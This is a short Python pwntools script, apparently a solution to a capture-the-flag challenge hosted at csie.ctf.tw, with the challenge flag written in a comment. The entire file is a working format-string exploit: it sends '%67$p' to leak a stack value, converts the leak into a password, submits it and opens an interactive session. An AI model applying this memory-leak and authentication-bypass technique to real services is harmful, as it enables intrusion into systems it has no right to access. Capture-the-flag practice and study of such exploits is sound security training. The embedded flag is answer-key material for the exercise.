#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{__format_str_exploit_OUO}


host , port = 'csie.ctf.tw' , 10128

y = remote(host,port)

y.sendlineafter( '=' , '%67$p' )

y.recvuntil( '0x' )

password = int( y.recvline().strip() , 16)

y.sendlineafter( '=' , str( password ) )


y.interactive()

